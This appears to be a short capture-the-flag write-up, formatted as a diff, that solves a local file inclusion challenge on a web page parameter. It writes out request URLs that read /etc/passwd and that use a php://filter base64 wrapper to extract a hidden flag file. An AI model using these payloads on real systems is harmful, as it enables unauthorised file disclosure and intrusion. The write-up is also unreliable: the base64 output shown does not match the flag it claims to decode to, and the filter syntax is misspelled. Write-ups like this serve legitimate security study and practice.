@@ -1,0 +1,32 @@
+LFI challenge:
+
+URL is http://53.98.254.215
+
+There is a URL param when navigating which is set to the required page
+
+Example: http://53.98.254.215/pages/page.php?f=read-me-bedford.php
+
+Let's read some files then:
+
+http://53.98.254.215/pages/page.php?f=/etc/passwd
+
+It works! But nothing interesting
+
+We scan the website and see there is a robots.txt
+
+There is an interesting line:
+Disallow: /somerandomtext/flag.php
+
+To bypass the disallow, we canuse php filter to encode the path:
+
+http://53.98.254.215/pages/page.php?f=php://filter/convert.base64-encode/resources=../somerandomtext/flag.php
+
+We get base64 text: PD9waHAKICAgICRmbGFnID0glk9GUFBULUNURnt0aDFzXzFzX2FuXzM0c3lfbGYxX2NoNGxsZW5nM30iOwo/Pgo=
+
+And:
+
+<?php
+    $flag = "BCTF{th1s_1s_1nclud2d}"
+?>
+
+Flag: BCTF{th1s_1s_1nclud2d}
